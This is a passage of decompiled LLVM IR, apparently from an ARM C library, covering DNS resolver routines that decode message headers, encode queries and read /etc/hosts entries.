  %v2_1d024 = inttoptr i32 %v1_1d024 to i8*
  %v3_1d024 = load i8, i8* %v2_1d024, align 1
  %v2_1d028 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d028 = add i32 %v2_1d028, 8
  %v4_1d028 = inttoptr i32 %v3_1d028 to i8*
  store i8 %v3_1d024, i8* %v4_1d028, align 1
  %v0_1d02c = load i32, i32* %ip.global-to-local, align 4
  %v1_1d02c = add i32 %v0_1d02c, 40
  %v2_1d02c = inttoptr i32 %v1_1d02c to i32*
  %v3_1d02c = load i32, i32* %v2_1d02c, align 4
  %v1_1d030 = trunc i32 %v3_1d02c to i8
  %v2_1d030 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d030 = add i32 %v2_1d030, 9
  %v4_1d030 = inttoptr i32 %v3_1d030 to i8*
  store i8 %v1_1d030, i8* %v4_1d030, align 1
  %v0_1d034 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d034 = add i32 %v0_1d034, 45
  %v2_1d034 = inttoptr i32 %v1_1d034 to i8*
  %v3_1d034 = load i8, i8* %v2_1d034, align 1
  %v2_1d038 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d038 = add i32 %v2_1d038, 10
  %v4_1d038 = inttoptr i32 %v3_1d038 to i8*
  store i8 %v3_1d034, i8* %v4_1d038, align 1
  %v0_1d03c = load i32, i32* %ip.global-to-local, align 4
  %v1_1d03c = add i32 %v0_1d03c, 44
  %v2_1d03c = inttoptr i32 %v1_1d03c to i32*
  %v3_1d03c = load i32, i32* %v2_1d03c, align 4
  %v1_1d040 = trunc i32 %v3_1d03c to i8
  %v2_1d040 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d040 = add i32 %v2_1d040, 11
  %v4_1d040 = inttoptr i32 %v3_1d040 to i8*
  store i8 %v1_1d040, i8* %v4_1d040, align 1
  %v2_1d048.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_1d048

dec_label_pc_1d048:                               ; preds = %entry, %bb17
  %v2_1d048 = phi i32 [ %v2_1d048.pre, %bb17 ], [ %v0_1cf68, %entry ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %entry ]
  store i32 %v2_1d048, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1cf8c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 45, { 3, 2, 0, 5, 4, 1 }
  uselistorder i32 37, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1d048, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1d050 = load i8, i8* %arg1, align 1
  %v4_1d050 = zext i8 %v3_1d050 to i32
  %v2_1d054 = add i32 %tmp, 1
  %v3_1d054 = inttoptr i32 %v2_1d054 to i8*
  %v4_1d054 = load i8, i8* %v3_1d054, align 1
  %v5_1d054 = zext i8 %v4_1d054 to i32
  %v4_1d058 = mul nuw nsw i32 %v4_1d050, 256
  %v5_1d058 = or i32 %v5_1d054, %v4_1d058
  %v2_1d05c = inttoptr i32 %arg2 to i32*
  store i32 %v5_1d058, i32* %v2_1d05c, align 4
  %v2_1d060 = add i32 %tmp, 2
  %v3_1d060 = inttoptr i32 %v2_1d060 to i8*
  %v4_1d060 = load i8, i8* %v3_1d060, align 1
  %tmp3 = icmp slt i8 %v4_1d060, 0
  %v3_1d064 = zext i1 %tmp3 to i32
  %v2_1d068 = add i32 %arg2, 4
  %v3_1d068 = inttoptr i32 %v2_1d068 to i32*
  store i32 %v3_1d064, i32* %v3_1d068, align 4
  %v4_1d06c = load i8, i8* %v3_1d060, align 1
  %div = udiv i8 %v4_1d06c, 8
  %tmp4 = urem i8 %div, 16
  %v1_1d074 = zext i8 %tmp4 to i32
  %v2_1d078 = add i32 %arg2, 8
  %v3_1d078 = inttoptr i32 %v2_1d078 to i32*
  store i32 %v1_1d074, i32* %v3_1d078, align 4
  %v4_1d07c = load i8, i8* %v3_1d060, align 1
  %div1 = udiv i8 %v4_1d07c, 4
  %tmp5 = urem i8 %div1, 2
  %v1_1d084 = zext i8 %tmp5 to i32
  %v2_1d088 = add i32 %arg2, 12
  %v3_1d088 = inttoptr i32 %v2_1d088 to i32*
  store i32 %v1_1d084, i32* %v3_1d088, align 4
  %v4_1d08c = load i8, i8* %v3_1d060, align 1
  %div2 = udiv i8 %v4_1d08c, 2
  %tmp6 = urem i8 %div2, 2
  %v1_1d094 = zext i8 %tmp6 to i32
  %v2_1d098 = add i32 %arg2, 16
  %v3_1d098 = inttoptr i32 %v2_1d098 to i32*
  store i32 %v1_1d094, i32* %v3_1d098, align 4
  %v4_1d09c = load i8, i8* %v3_1d060, align 1
  %tmp7 = urem i8 %v4_1d09c, 2
  %v1_1d0a0 = zext i8 %tmp7 to i32
  %v2_1d0a4 = add i32 %arg2, 20
  %v3_1d0a4 = inttoptr i32 %v2_1d0a4 to i32*
  store i32 %v1_1d0a0, i32* %v3_1d0a4, align 4
  %v2_1d0a8 = add i32 %tmp, 3
  %v3_1d0a8 = inttoptr i32 %v2_1d0a8 to i8*
  %v4_1d0a8 = load i8, i8* %v3_1d0a8, align 1
  %tmp8 = icmp slt i8 %v4_1d0a8, 0
  %v3_1d0ac = zext i1 %tmp8 to i32
  %v2_1d0b0 = add i32 %arg2, 24
  %v3_1d0b0 = inttoptr i32 %v2_1d0b0 to i32*
  store i32 %v3_1d0ac, i32* %v3_1d0b0, align 4
  %v4_1d0b4 = load i8, i8* %v3_1d0a8, align 1
  %tmp9 = urem i8 %v4_1d0b4, 16
  %v1_1d0b8 = zext i8 %tmp9 to i32
  %v2_1d0bc = add i32 %arg2, 28
  %v3_1d0bc = inttoptr i32 %v2_1d0bc to i32*
  store i32 %v1_1d0b8, i32* %v3_1d0bc, align 4
  %v2_1d0c0 = add i32 %tmp, 4
  %v3_1d0c0 = inttoptr i32 %v2_1d0c0 to i8*
  %v4_1d0c0 = load i8, i8* %v3_1d0c0, align 1
  %v5_1d0c0 = zext i8 %v4_1d0c0 to i32
  %v2_1d0c4 = add i32 %tmp, 5
  %v3_1d0c4 = inttoptr i32 %v2_1d0c4 to i8*
  %v4_1d0c4 = load i8, i8* %v3_1d0c4, align 1
  %v5_1d0c4 = zext i8 %v4_1d0c4 to i32
  %v4_1d0c8 = mul nuw nsw i32 %v5_1d0c0, 256
  %v5_1d0c8 = or i32 %v5_1d0c4, %v4_1d0c8
  %v2_1d0cc = add i32 %arg2, 32
  %v3_1d0cc = inttoptr i32 %v2_1d0cc to i32*
  store i32 %v5_1d0c8, i32* %v3_1d0cc, align 4
  %v2_1d0d0 = add i32 %tmp, 6
  %v3_1d0d0 = inttoptr i32 %v2_1d0d0 to i8*
  %v4_1d0d0 = load i8, i8* %v3_1d0d0, align 1
  %v5_1d0d0 = zext i8 %v4_1d0d0 to i32
  %v2_1d0d4 = add i32 %tmp, 7
  %v3_1d0d4 = inttoptr i32 %v2_1d0d4 to i8*
  %v4_1d0d4 = load i8, i8* %v3_1d0d4, align 1
  %v5_1d0d4 = zext i8 %v4_1d0d4 to i32
  %v4_1d0d8 = mul nuw nsw i32 %v5_1d0d0, 256
  %v5_1d0d8 = or i32 %v5_1d0d4, %v4_1d0d8
  %v2_1d0dc = add i32 %arg2, 36
  %v3_1d0dc = inttoptr i32 %v2_1d0dc to i32*
  store i32 %v5_1d0d8, i32* %v3_1d0dc, align 4
  %v2_1d0e0 = add i32 %tmp, 8
  %v3_1d0e0 = inttoptr i32 %v2_1d0e0 to i8*
  %v4_1d0e0 = load i8, i8* %v3_1d0e0, align 1
  %v5_1d0e0 = zext i8 %v4_1d0e0 to i32
  %v2_1d0e4 = add i32 %tmp, 9
  %v3_1d0e4 = inttoptr i32 %v2_1d0e4 to i8*
  %v4_1d0e4 = load i8, i8* %v3_1d0e4, align 1
  %v5_1d0e4 = zext i8 %v4_1d0e4 to i32
  %v4_1d0e8 = mul nuw nsw i32 %v5_1d0e0, 256
  %v5_1d0e8 = or i32 %v5_1d0e4, %v4_1d0e8
  %v2_1d0ec = add i32 %arg2, 40
  %v3_1d0ec = inttoptr i32 %v2_1d0ec to i32*
  store i32 %v5_1d0e8, i32* %v3_1d0ec, align 4
  %v2_1d0f0 = add i32 %tmp, 11
  %v3_1d0f0 = inttoptr i32 %v2_1d0f0 to i8*
  %v4_1d0f0 = load i8, i8* %v3_1d0f0, align 1
  %v5_1d0f0 = zext i8 %v4_1d0f0 to i32
  %v2_1d0f4 = add i32 %tmp, 10
  %v3_1d0f4 = inttoptr i32 %v2_1d0f4 to i8*
  %v4_1d0f4 = load i8, i8* %v3_1d0f4, align 1
  %v5_1d0f4 = zext i8 %v4_1d0f4 to i32
  %v4_1d0f8 = mul nuw nsw i32 %v5_1d0f4, 256
  %v5_1d0f8 = or i32 %v4_1d0f8, %v5_1d0f0
  %v2_1d0fc = add i32 %arg2, 44
  %v3_1d0fc = inttoptr i32 %v2_1d0fc to i32*
  store i32 %v5_1d0f8, i32* %v3_1d0fc, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 44, { 13, 14, 11, 12, 2, 15, 10, 39, 1, 3, 23, 24, 25, 26, 27, 28, 20, 21, 22, 16, 17, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 0, 4, 18, 5, 6, 7, 8, 19, 9 }
  uselistorder i32 11, { 20, 21, 7, 8, 9, 10, 11, 22, 24, 12, 4, 5, 6, 13, 14, 15, 16, 17, 18, 0, 19, 3, 2, 1, 23 }
  uselistorder i32 40, { 12, 13, 16, 1, 5, 14, 17, 2, 15, 4, 3, 0, 6, 7, 8, 9, 10, 11, 18 }
  uselistorder i32 36, { 27, 28, 31, 32, 33, 34, 8, 4, 7, 29, 9, 23, 10, 24, 11, 1, 5, 30, 12, 13, 14, 15, 0, 2, 16, 17, 3, 18, 19, 25, 26, 20, 21, 6, 35, 22 }
  uselistorder i32 7, { 21, 22, 16, 0, 11, 12, 1, 2, 24, 18, 19, 20, 3, 4, 5, 6, 17, 7, 13, 14, 8, 9, 15, 10, 23 }
  uselistorder i32 28, { 48, 6, 8, 51, 7, 54, 55, 60, 62, 63, 9, 10, 61, 11, 12, 56, 35, 49, 50, 29, 13, 30, 14, 66, 47, 64, 15, 1, 36, 16, 17, 18, 3, 19, 52, 53, 2, 57, 58, 37, 38, 39, 40, 41, 42, 43, 0, 44, 31, 59, 32, 33, 34, 4, 5, 45, 24, 23, 21, 22, 28, 25, 26, 46, 20, 27, 65 }
  uselistorder i8 2, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 4, { 2, 0, 1, 3, 4 }
  uselistorder i8 16, { 1, 2, 0, 3 }
  uselistorder i8 8, { 1, 0 }
  uselistorder i32 %arg2, { 3, 0, 8, 1, 6, 2, 10, 11, 7, 9, 4, 5 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r2, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1d104 = load i32, i32* @r4, align 4
  store i32 %v3_1d104, i32* %stack_var_-16, align 4
  %v9_1d104 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_1d10c = load i32, i32* %arg1, align 4
  store i32 %v2_1d10c, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  %v1_1d118 = inttoptr i32 %v2_1d10c to i8*
  %v2_1d118 = call i32 @__encode_dotted(i8* %v1_1d118)
  store i32 %v2_1d118, i32* %r0.global-to-local, align 4
  %v1_1d11c = icmp slt i32 %v2_1d118, 0
  br i1 %v1_1d11c, label %dec_label_pc_1d15c, label %dec_label_pc_1d124

dec_label_pc_1d124:                               ; preds = %entry
  %v1_1d124 = load i32, i32* @r5, align 4
  %v2_1d124 = sub i32 %v1_1d124, %v2_1d118
  %v7_1d12c = icmp slt i32 %v2_1d124, 4
  br i1 %v7_1d12c, label %bb, label %dec_label_pc_1d134

bb:                                               ; preds = %dec_label_pc_1d124
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d15c

dec_label_pc_1d134:                               ; preds = %dec_label_pc_1d124
  %v0_1d134 = load i32, i32* @r4, align 4
  %v1_1d134 = add i32 %v0_1d134, 5
  %v2_1d134 = inttoptr i32 %v1_1d134 to i8*
  %v3_1d134 = load i8, i8* %v2_1d134, align 1
  %v2_1d138 = load i32, i32* @r6, align 4
  %v4_1d138 = add i32 %v2_1d138, %v2_1d118
  %v5_1d138 = inttoptr i32 %v4_1d138 to i8*
  store i8 %v3_1d134, i8* %v5_1d138, align 1
  %v0_1d13c = load i32, i32* @r4, align 4
  %v1_1d13c = add i32 %v0_1d13c, 4
  %v2_1d13c = inttoptr i32 %v1_1d13c to i32*
  %v3_1d13c = load i32, i32* %v2_1d13c, align 4
  %v0_1d140 = load i32, i32* @r6, align 4
  %v1_1d140 = load i32, i32* %r0.global-to-local, align 4
  %v2_1d140 = add i32 %v1_1d140, %v0_1d140
  store i32 %v2_1d140, i32* %r2.global-to-local, align 4
  %v1_1d144 = trunc i32 %v3_1d13c to i8
  %v3_1d144 = add i32 %v2_1d140, 1
  %v4_1d144 = inttoptr i32 %v3_1d144 to i8*
  store i8 %v1_1d144, i8* %v4_1d144, align 1
  %v0_1d148 = load i32, i32* @r4, align 4
  %v1_1d148 = add i32 %v0_1d148, 9
  %v2_1d148 = inttoptr i32 %v1_1d148 to i8*
  %v3_1d148 = load i8, i8* %v2_1d148, align 1
  %v2_1d14c = load i32, i32* %r2.global-to-local, align 4
  %v3_1d14c = add i32 %v2_1d14c, 2
  %v4_1d14c = inttoptr i32 %v3_1d14c to i8*
  store i8 %v3_1d148, i8* %v4_1d14c, align 1
  %v0_1d150 = load i32, i32* @r4, align 4
  %v1_1d150 = add i32 %v0_1d150, 8
  %v2_1d150 = inttoptr i32 %v1_1d150 to i32*
  %v3_1d150 = load i32, i32* %v2_1d150, align 4
  %v1_1d154 = trunc i32 %v3_1d150 to i8
  %v2_1d154 = load i32, i32* %r2.global-to-local, align 4
  %v3_1d154 = add i32 %v2_1d154, 3
  %v4_1d154 = inttoptr i32 %v3_1d154 to i8*
  store i8 %v1_1d154, i8* %v4_1d154, align 1
  %v0_1d158 = load i32, i32* %r0.global-to-local, align 4
  %v1_1d158 = add i32 %v0_1d158, 4
  store i32 %v1_1d158, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1d15c

dec_label_pc_1d15c:                               ; preds = %bb, %entry, %dec_label_pc_1d134
  %v1_1d160 = phi i32 [ -1, %bb ], [ %v2_1d118, %entry ], [ %v1_1d158, %dec_label_pc_1d134 ]
  %v2_1d15c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1d15c, i32* @r4, align 4
  store i32 %v9_1d104, i32* @r6, align 4
  ret i32 %v1_1d160

; uselistorder directives
  uselistorder i32 %v2_1d118, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 5, 2, 6, 3, 0 }
  uselistorder i32 9, { 22, 23, 24, 27, 28, 4, 26, 21, 5, 15, 0, 16, 32, 6, 7, 14, 25, 12, 13, 17, 18, 19, 20, 8, 9, 10, 11, 3, 2, 1, 29, 30, 31 }
  uselistorder i32 5, { 23, 24, 25, 7, 17, 8, 26, 9, 2, 18, 10, 19, 12, 11, 3, 0, 28, 5, 20, 6, 1, 21, 22, 13, 14, 16, 15, 4, 27 }
  uselistorder label %dec_label_pc_1d15c, { 2, 0, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -32840), i32* @r0, align 4
  %v1_1d17c = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -32840))
  ret i32 %v1_1d17c

; uselistorder directives
  uselistorder i32 (i32)* @__GI_config_open, { 0, 2, 1 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v3_1d194 = load i32, i32* @r4, align 4
  %v6_1d194 = load i32, i32* @r5, align 4
  %v9_1d194 = load i32, i32* @r6, align 4
  %v12_1d194 = load i32, i32* @r7, align 4
  %v15_1d194 = load i32, i32* @r8, align 4
  %v18_1d194 = load i32, i32* @sb, align 4
  %v21_1d194 = load i32, i32* @sl, align 4
  %v24_1d194 = load i32, i32* @fp, align 4
  store i32 %tmp10, i32* @r5, align 4
  store i32 %tmp9, i32* @lr, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 -1, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r4, align 4
  %v2_1d1bc = inttoptr i32 %tmp9 to i32*
  store i32 -1, i32* %v2_1d1bc, align 4
  %v0_1d1c0 = load i32, i32* @r0, align 4
  store i32 %v0_1d1c0, i32* @r6, align 4
  %v0_1d1c4 = load i32, i32* @r1, align 4
  %v0_1d1c8 = load i32, i32* @r2, align 4
  store i32 %v0_1d1c8, i32* @r8, align 4
  %v0_1d1cc = load i32, i32* @r3, align 4
  store i32 %v0_1d1cc, i32* @fp, align 4
  %v3_1d1d0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1d1d0, i32* @r7, align 4
  %tmp = icmp ult i32 %tmp10, 129
  br i1 %tmp, label %.thread, label %dec_label_pc_1d1dc

.thread:                                          ; preds = %entry
  store i32 34, i32* @sb, align 4
  br label %dec_label_pc_1d37c

dec_label_pc_1d1dc:                               ; preds = %entry
  %v2_1d1dc = icmp eq i32 %v0_1d1c0, 0
  br i1 %v2_1d1dc, label %dec_label_pc_1d1e4, label %dec_label_pc_1d204

dec_label_pc_1d1e4:                               ; preds = %dec_label_pc_1d1dc
  %v0_1d1e4 = call i32 @__open_etc_hosts()
  store i32 %v0_1d1e4, i32* @r6, align 4
  %v2_1d1e8 = icmp eq i32 %v0_1d1e4, 0
  br i1 %v2_1d1e8, label %dec_label_pc_1d1f0, label %dec_label_pc_1d204

dec_label_pc_1d1f0:                               ; preds = %dec_label_pc_1d1e4
  store i32 %tmp7, i32* %r2.global-to-local, align 4
  %v2_1d1f4 = inttoptr i32 %tmp7 to i32*
  store i32 0, i32* %v2_1d1f4, align 4
  %v0_1d1f8 = call i32 @__GI___errno_location()
  %v1_1d1fc = inttoptr i32 %v0_1d1f8 to i32*
  %v2_1d1fc = load i32, i32* %v1_1d1fc, align 4
  store i32 %v2_1d1fc, i32* @sb, align 4
  br label %dec_label_pc_1d37c

dec_label_pc_1d204:                               ; preds = %dec_label_pc_1d1e4, %dec_label_pc_1d1dc
  %v1_1d224 = phi i32 [ %v0_1d1e4, %dec_label_pc_1d1e4 ], [ %v0_1d1c0, %dec_label_pc_1d1dc ]
  %v0_1d208 = load i32, i32* @r4, align 4
  %v2_1d208 = add i32 %v0_1d208, -32828
  store i32 %v2_1d208, i32* @r4, align 4
  %v2_1d20c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %tmp6, i32* %ip.global-to-local, align 4
  store i32 %tmp6, i32* @lr, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_1d224 = add i32 %v1_1d224, 8
  %v3_1d224 = inttoptr i32 %v2_1d224 to i32*
  store i32 48, i32* %v3_1d224, align 4
  store i32 %tmp9, i32* %r3.global-to-local, align 4
  %v0_1d22c = load i32, i32* @r5, align 4
  %v1_1d22c = add i32 %v0_1d22c, -48
  store i32 %v1_1d22c, i32* %r1.global-to-local, align 4
  %v0_1d230 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d230 = add i32 %v0_1d230, 24
  store i32 %v1_1d230, i32* @ip, align 4
  %v0_1d234 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1d234, i32* @sb, align 4
  %v0_1d238 = load i32, i32* @lr, align 4
  %v1_1d238 = add i32 %v0_1d238, 32
  store i32 %v1_1d238, i32* @sl, align 4
  %v1_1d23c = load i32, i32* @r6, align 4
  %v2_1d23c = add i32 %v1_1d23c, 16
  %v3_1d23c = inttoptr i32 %v2_1d23c to i32*
  store i32 %v1_1d22c, i32* %v3_1d23c, align 4
  %v0_1d240 = load i32, i32* @r4, align 4
  %v0_1d244 = load i32, i32* @ip, align 4
  store i32 %v0_1d244, i32* %stack_var_-64, align 4
  %v0_1d248 = load i32, i32* %r2.global-to-local, align 4
  %v1_1d248 = load i32, i32* %r3.global-to-local, align 4
  %v2_1d248 = inttoptr i32 %v1_1d248 to i32*
  store i32 %v0_1d248, i32* %v2_1d248, align 4
  %v0_1d24c = load i32, i32* @lr, align 4
  %v1_1d24c = load i32, i32* @r6, align 4
  %v2_1d24c = add i32 %v1_1d24c, 4
  %v3_1d24c = inttoptr i32 %v2_1d24c to i32*
  store i32 %v0_1d24c, i32* %v3_1d24c, align 4
  %v2_1d27c = inttoptr i32 %v0_1d1c4 to i8*
  br label %dec_label_pc_1d350

dec_label_pc_1d254:                               ; preds = %dec_label_pc_1d350
  %v3_1d254 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d254, i32* %r1.global-to-local, align 4
  %v0_1d258 = load i32, i32* @fp, align 4
  %v7_1d258 = icmp eq i32 %v0_1d258, 1
  %v1_1d25c = add i32 %v3_1d254, 4
  store i32 %v1_1d25c, i32* @r5, align 4
  %v1_1d260 = load i32, i32* @r7, align 4
  %v2_1d260 = add i32 %v1_1d260, 4
  %v3_1d260 = inttoptr i32 %v2_1d260 to i32*
  store i32 %v1_1d25c, i32* %v3_1d260, align 4
  br i1 %v7_1d258, label %dec_label_pc_1d37c, label %dec_label_pc_1d268

dec_label_pc_1d268:                               ; preds = %dec_label_pc_1d254
  %v0_1d268 = load i32, i32* @fp, align 4
  %v7_1d268 = icmp eq i32 %v0_1d268, 2
  br i1 %v7_1d268, label %dec_label_pc_1d274, label %dec_label_pc_1d298.preheader

dec_label_pc_1d298.preheader:                     ; preds = %dec_label_pc_1d268
  %v1_1d26c = load i32, i32* @r5, align 4
  %v1_1d29825 = inttoptr i32 %v1_1d26c to i32*
  %v2_1d29826 = load i32, i32* %v1_1d29825, align 4
  store i32 %v2_1d29826, i32* %r3.global-to-local, align 4
  store i32 %v2_1d29826, i32* %r1.global-to-local, align 4
  %v2_1d29c28 = icmp eq i32 %v2_1d29826, 0
  %v1_1d2a429 = add i32 %v1_1d26c, 4
  store i32 %v1_1d2a429, i32* @r4, align 4
  br i1 %v2_1d29c28, label %dec_label_pc_1d350, label %dec_label_pc_1d28c

dec_label_pc_1d274:                               ; preds = %dec_label_pc_1d268
  %v0_1d274 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d274 = inttoptr i32 %v0_1d274 to i32*
  %v2_1d274 = load i32, i32* %v1_1d274, align 4
  store i32 %v2_1d274, i32* @r1, align 4
  %v3_1d27c = call i32 @__GI_strcoll(i8* %v2_1d27c, i32 %v2_1d274)
  %v2_1d280 = icmp eq i32 %v3_1d27c, 0
  br i1 %v2_1d280, label %dec_label_pc_1d2b0, label %dec_label_pc_1d350

dec_label_pc_1d28c:                               ; preds = %dec_label_pc_1d298.preheader, %dec_label_pc_1d28c.dec_label_pc_1d298_crit_edge
  %v2_1d29830 = phi i32 [ %v2_1d298, %dec_label_pc_1d28c.dec_label_pc_1d298_crit_edge ], [ %v2_1d29826, %dec_label_pc_1d298.preheader ]
  %v3_1d28c = call i32 @__GI_strcasecmp(i8* %v2_1d27c, i32 %v2_1d29830)
  %v2_1d290 = icmp eq i32 %v3_1d28c, 0
  br i1 %v2_1d290, label %dec_label_pc_1d2b0, label %dec_label_pc_1d28c.dec_label_pc_1d298_crit_edge

dec_label_pc_1d28c.dec_label_pc_1d298_crit_edge:  ; preds = %dec_label_pc_1d28c
  %v0_1d298.pre = load i32, i32* @r4, align 4
  %v1_1d298 = inttoptr i32 %v0_1d298.pre to i32*
  %v2_1d298 = load i32, i32* %v1_1d298, align 4
  store i32 %v2_1d298, i32* %r3.global-to-local, align 4
  store i32 %v2_1d298, i32* %r1.global-to-local, align 4
  %v2_1d29c = icmp eq i32 %v2_1d298, 0
  %v1_1d2a4 = add i32 %v0_1d298.pre, 4
  store i32 %v1_1d2a4, i32* @r4, align 4
  br i1 %v2_1d29c, label %dec_label_pc_1d350, label %dec_label_pc_1d28c

dec_label_pc_1d2b0:                               ; preds = %dec_label_pc_1d28c, %dec_label_pc_1d274
  %v0_1d2b0 = load i32, i32* @r5, align 4
  %v1_1d2b0 = inttoptr i32 %v0_1d2b0 to i32*
  %v2_1d2b0 = load i32, i32* %v1_1d2b0, align 4
  store i32 %v2_1d2b0, i32* %r3.global-to-local, align 4
  %v4_1d2b0 = add i32 %v0_1d2b0, 4
  store i32 %v4_1d2b0, i32* @r5, align 4
  %v2_1d2b4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_1d2b4, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v1_1d2bc = load i32, i32* @r7, align 4
  %v2_1d2bc = inttoptr i32 %v1_1d2bc to i32*
  store i32 %v2_1d2b0, i32* %v2_1d2bc, align 4
  %v0_1d2c0 = load i32, i32* @lr, align 4
  %v1_1d2c0 = load i32, i32* @ip, align 4
  %v2_1d2c0 = add i32 %v1_1d2c0, 4
  %v3_1d2c0 = inttoptr i32 %v2_1d2c0 to i32*
  store i32 %v0_1d2c0, i32* %v3_1d2c0, align 4
  store i32 %tmp6, i32* %r2.global-to-local, align 4
  %v0_1d2c8 = load i32, i32* @r8, align 4
  %v7_1d2c8 = icmp eq i32 %v0_1d2c8, 2
  %v0_1d2cc = load i32, i32* @r5, align 4
  %v1_1d2cc = load i32, i32* @r7, align 4
  %v2_1d2cc = add i32 %v1_1d2cc, 4
  %v3_1d2cc = inttoptr i32 %v2_1d2cc to i32*
  store i32 %v0_1d2cc, i32* %v3_1d2cc, align 4
  %v0_1d2d0 = load i32, i32* @ip, align 4
  %v1_1d2d0 = load i32, i32* @r7, align 4
  %v2_1d2d0 = add i32 %v1_1d2d0, 16
  %v3_1d2d0 = inttoptr i32 %v2_1d2d0 to i32*
  store i32 %v0_1d2d0, i32* %v3_1d2d0, align 4
  %v0_1d2d4 = load i32, i32* @sl, align 4
  %v1_1d2d4 = load i32, i32* %r2.global-to-local, align 4
  %v2_1d2d4 = add i32 %v1_1d2d4, 24
  %v3_1d2d4 = inttoptr i32 %v2_1d2d4 to i32*
  store i32 %v0_1d2d4, i32* %v3_1d2d4, align 4
  br i1 %v7_1d2c8, label %dec_label_pc_1d2dc, label %dec_label_pc_1d30c

dec_label_pc_1d2dc:                               ; preds = %dec_label_pc_1d2b0
  %v3_1d2dc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d2dc, i32* %r3.global-to-local, align 4
  %v0_1d2e0 = load i32, i32* @r8, align 4
  %v1_1d2e4 = inttoptr i32 %v3_1d2dc to i32*
  %v2_1d2e4 = load i32, i32* %v1_1d2e4, align 4
  store i32 %v2_1d2e4, i32* %r1.global-to-local, align 4
  %v0_1d2e8 = load i32, i32* @sl, align 4
  store i32 %v0_1d2e8, i32* %r2.global-to-local, align 4
  %v3_1d2ec = inttoptr i32 %v2_1d2e4 to i8*
  %v4_1d2ec = call i32 @inet_pton(i32 %v0_1d2e0, i8* %v3_1d2ec, i32 %v0_1d2e8)
  %tmp23 = icmp slt i32 %v4_1d2ec, 1
  br i1 %tmp23, label %dec_label_pc_1d34c, label %dec_label_pc_1d2f8

dec_label_pc_1d2f8:                               ; preds = %dec_label_pc_1d2dc
  %v0_1d2fc = load i32, i32* @r7, align 4
  %v2_1d2fc = inttoptr i32 %tmp7 to i32*
  store i32 %v0_1d2fc, i32* %v2_1d2fc, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_1d304 = load i32, i32* @r8, align 4
  %v1_1d304 = load i32, i32* @r7, align 4
  %v2_1d304 = add i32 %v1_1d304, 8
  %v3_1d304 = inttoptr i32 %v2_1d304 to i32*
  store i32 %v0_1d304, i32* %v3_1d304, align 4
  %v0_1d344.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1d340

dec_label_pc_1d30c:                               ; preds = %dec_label_pc_1d2b0
  %v0_1d30c = load i32, i32* @r8, align 4
  %v7_1d30c = icmp eq i32 %v0_1d30c, 10
  br i1 %v7_1d30c, label %dec_label_pc_1d314, label %dec_label_pc_1d34c

dec_label_pc_1d314:                               ; preds = %dec_label_pc_1d30c
  %v3_1d314 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1d314, i32* %r3.global-to-local, align 4
  %v1_1d31c = inttoptr i32 %v3_1d314 to i32*
  %v2_1d31c = load i32, i32* %v1_1d31c, align 4
  store i32 %v2_1d31c, i32* %r1.global-to-local, align 4
  %v0_1d320 = load i32, i32* @sl, align 4
  store i32 %v0_1d320, i32* %r2.global-to-local, align 4
  %v3_1d324 = inttoptr i32 %v2_1d31c to i8*
